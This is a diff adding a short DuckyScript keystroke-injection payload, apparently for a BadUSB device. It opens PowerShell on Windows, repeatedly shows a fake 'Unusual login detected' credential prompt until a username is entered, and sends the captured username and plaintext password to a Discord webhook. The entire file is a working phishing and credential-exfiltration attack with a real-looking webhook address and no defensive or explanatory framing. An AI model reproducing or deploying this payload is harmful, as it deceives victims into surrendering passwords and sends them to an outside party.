@@ -1,0 +1,8 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 2000
+STRING $webhookUrl="https://discord.com/api/webhooks/1179191552816451624/_ioqyoErmm_b4UEBibKe8RsDeJlOzWSdRhpLvFFRxdFmhoo0ftHOQvexdYAxZkx_ez93"; Start-Process powershell -ArgumentList "-WindowStyle Minimized -NoExit -Command `& { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('%r'); do {`$credentials=Get-Credential -Message 'Unusual login detected. Please enter your credentials'} until (`$credentials -and `$credentials.UserName); `$payload=@{content='Username: ' + `$credentials.UserName + ' Password: ' + `$credentials.GetNetworkCredential().Password}; Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (`$payload|ConvertTo-Json) -ContentType 'application/json'; Write-Host 'Credentials input successfully.'; exit }"
+ENTER
